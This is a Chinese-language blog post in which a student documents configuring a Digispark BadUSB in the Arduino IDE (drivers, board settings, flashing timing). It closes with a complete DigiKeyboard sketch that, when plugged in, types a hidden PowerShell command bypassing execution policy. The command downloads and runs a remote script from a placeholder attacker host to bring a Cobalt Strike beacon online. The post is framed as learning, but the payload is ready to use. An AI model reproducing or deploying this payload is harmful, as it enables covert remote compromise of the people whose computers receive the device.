## 前言一

纯软工学生，，对硬件概念真是模糊的可怜，  
整个过程搞了快两天，，惭愧惭愧

因为上网搜很多都解决不了我的问题，没有那个人就做那个人

p.s.此博客仅作学习用，而且因为最近在学习cobaltstrike所以脚本为cs上马方向，BadUSB其余脚本资源很多大家可以自行搜索学习

 **声明** ：因为我的BadUSB时Digispark所以就这个来做介绍并且写一下制作过程中亲身经历踩到崩溃的坑

其余版本的网上资料蛮多的

## 前言二

首先了解一下BadUSB，这部分知识网上很多，我截取一个简介

并且清楚，BadUSB不是U盘！![1639837111_61bdedb7122a88bb67a90.png!small?1639837109443](https://image.3001.net/images/20211218/1639837111_61bdedb7122a88bb67a90.png!small?1639837109443)

## 从始至终必要条件

### arduino

Arduino是一款便捷灵活、方便上手的开源电子原型平台。 它构建于开放原始码simple  
I/O介面版，并且具有使用类似Java、C语言的Processing/Wiring开发环境。主要包含两个主要的部分：硬件部分是可以用来做电路连接的Arduino电路板；另外一个则是Arduino
IDE，你的计算机中的程序开发环境。你只要在IDE中编写程序代码，将程序上传到Arduino电路板后，程序便会告诉Arduino电路板要做些什么了。  
下载：[传送门](https://www.arduino.cc/)

 **这块踩坑一般，挂梯子会下的快一点**

![1639838127_61bdf1afb42e52a6957a5.png!small?1639838126610](https://image.3001.net/images/20211218/1639838127_61bdf1afb42e52a6957a5.png!small?1639838126610)

双击应用程序安装即可

![1639838853_61bdf48512e7e5637c952.png!small?1639838851382](https://image.3001.net/images/20211218/1639838853_61bdf48512e7e5637c952.png!small?1639838851382)

出现这个即成功

### 安装驱动（Digistump Drivers）

从上一步结束后，，踩坑之路正式开启

对硬件知识匮乏的我，，根本不知道还要安装驱动

![1639838264_61bdf2383bbb5620423ba.png!small?1639838262835](https://image.3001.net/images/20211218/1639838264_61bdf2383bbb5620423ba.png!small?1639838262835)

就导致一直上传不上，插上BadUSB端口处也没有丝毫反应

后来跟仪电同学抱怨人家直接一句 **你驱动装对了吗** 我就愣住了

跟店家确认信息后需要安装此驱动

链接：http://pan.baidu.com/s/1i4K10dn 密码：ilaf

![1639838581_61bdf375d9c93cd07cea1.png!small?1639838580216](https://image.3001.net/images/20211218/1639838581_61bdf375d9c93cd07cea1.png!small?1639838580216)

注意：64位的系统安装DPinst64哈

安这个直接下一步大法就完事了~~

![1639838663_61bdf3c7695f9b1bf6ac0.png!small?1639838661843](https://image.3001.net/images/20211218/1639838663_61bdf3c7695f9b1bf6ac0.png!small?1639838661843)

显示这个即为安装成功

OK。到这步驱动踩坑完毕~~~~呜呜呜

### 正确配置配置板子信息

### 1.准备步骤

这步很重要，总结一下这两天心路历程最重要的就是啥都不懂就随便乱试，

所以Digispark的板子就按照这个步骤配信息吧

![1639838997_61bdf51507e4767f56d16.png!small?1639838995447](https://image.3001.net/images/20211218/1639838997_61bdf51507e4767f56d16.png!small?1639838995447)

![1639839015_61bdf527853939959128e.png!small?1639839014257](https://image.3001.net/images/20211218/1639839015_61bdf527853939959128e.png!small?1639839014257)

附加开发板管理器网址：http://digistump.com/package_digistump_index.json

![1639839070_61bdf55e6d522bae11200.png!small?1639839068966](https://image.3001.net/images/20211218/1639839070_61bdf55e6d522bae11200.png!small?1639839068966)这里坑又出现了，，，

 **挂梯子（开代理）！**

否则找不到下面的Digistump AVR信息！

![1639839170_61bdf5c2e51e468447d53.png!small?1639839169411](https://image.3001.net/images/20211218/1639839170_61bdf5c2e51e468447d53.png!small?1639839169411)![1639839185_61bdf5d1ec91d8ce057b2.png!small?1639839184334](https://image.3001.net/images/20211218/1639839185_61bdf5d1ec91d8ce057b2.png!small?1639839184334)等待下载即可

![1639839217_61bdf5f1058eb9e81ddfb.png!small?1639839215380](https://image.3001.net/images/20211218/1639839217_61bdf5f1058eb9e81ddfb.png!small?1639839215380)成功下载后界面如图

准备步骤完成！

### 2.开始配置

开发板：

![1639839353_61bdf6790ad38caa2ee7e.png!small?1639839352042](https://image.3001.net/images/20211218/1639839353_61bdf6790ad38caa2ee7e.png!small?1639839352042)

下载完成后在arduino界面即可出现开发板信息，选择如图即可

编辑器：

![1639839714_61bdf7e2e7c3e75ca3a03.png!small?1639839713846](https://image.3001.net/images/20211218/1639839714_61bdf7e2e7c3e75ca3a03.png!small?1639839713846)

搞定

![1639839755_61bdf80b704ecfd6f6b42.png!small?1639839753849](https://image.3001.net/images/20211218/1639839755_61bdf80b704ecfd6f6b42.png!small?1639839753849)

这个信息亲测没问题！可以完成后续工作！

### 开始烧录

 **其实前面部分烧录踩坑就是没驱动，板子信息乱写，编辑器也乱选导致的无穷无尽的失败，，，**

所以前面部分搞定基本在后面不会有什么问题了~

 **做事之前一定要先学习，先思考，这次是真的深有体会**

 **示例** ：空白脚本覆盖掉出厂脚本

1.在arduino编译，检查语法错误

![1639840071_61bdf94782ab28a96cc01.png!small?1639840069887](https://image.3001.net/images/20211218/1639840071_61bdf94782ab28a96cc01.png!small?1639840069887)对号：编译，箭头：上传

![1639840121_61bdf979b6df36ca88b00.png!small?1639840121919](https://image.3001.net/images/20211218/1639840121_61bdf979b6df36ca88b00.png!small?1639840121919)出现此页面无报错信息即为编译成功

上传： **此处有巨坑！！！** （自己做是坑，但是得到指导的话也就一分钟的事，，，）

此处我用上马脚本

点击上传，会先进行编译， **此时插入BU的话大概率上传成功但无法覆盖！！！** ，，菜鸡并不知道为什么

就像这样！！

![1639840715_61bdfbcb1e2e2a590af38.png!small?1639840713475](https://image.3001.net/images/20211218/1639840715_61bdfbcb1e2e2a590af38.png!small?1639840713475)

**直到出现上传...字样再插入**![1639840515_61bdfb03c63b51286f15e.png!small?1639840514180](https://image.3001.net/images/20211218/1639840515_61bdfb03c63b51286f15e.png!small?1639840514180)

此时插入BU

![1639840767_61bdfbff73d5739294685.png!small?1639840765786](https://image.3001.net/images/20211218/1639840767_61bdfbff73d5739294685.png!small?1639840765786)

很快便可上传成功！！！！！

此时就可以完全覆盖并修改为新脚本。

## 利用完备的BadUSB结合cobaltstrike实践

通过以上的内容已经让我们收获了一个配置完整的BU，只需要修改脚本便可变成一个近源渗透得力工具

1.准备脚本

#include "DigiKeyboard.h"  
#define KEY_ESC 41  
#define KEY_BACKSPACE 42  
#define KEY_TAB 43  
#define KEY_PRT_SCR 70  
#define KEY_DELETE 76

void setup() {

DigiKeyboard.delay(5000);  
DigiKeyboard.sendKeyStroke(0);  
DigiKeyboard.delay(3000);  
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);  
DigiKeyboard.delay(1000);  
DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoLogo -executionpolicy
bypass IEX(New-Object Net.WebClient).DownloadString('http://your ip:your
port/1.ps1');"));  
DigiKeyboard.delay(500);  
DigiKeyboard.sendKeyStroke(KEY_ENTER);  
DigiKeyboard.delay(750);  
DigiKeyboard.sendKeyStroke(KEY_ENTER);

}  
void loop() {  
}

2.进行烧录

按照上文的上传步骤即可完成录入

 **之后在客户端，服务端配置完成cobaltstrike** ，插入BadUSB，

即可自动执行最终成功在CS上线

CS内容过于庞大，这里借鉴下其他师傅的博客

<https://www.freebuf.com/articles/web/262543.html>

师傅们不太了解的可以来这里了解一下哈

好，到这里，暂停BadUSB踩坑之旅，要学的东西还很多，欢迎师傅们一起交流技术

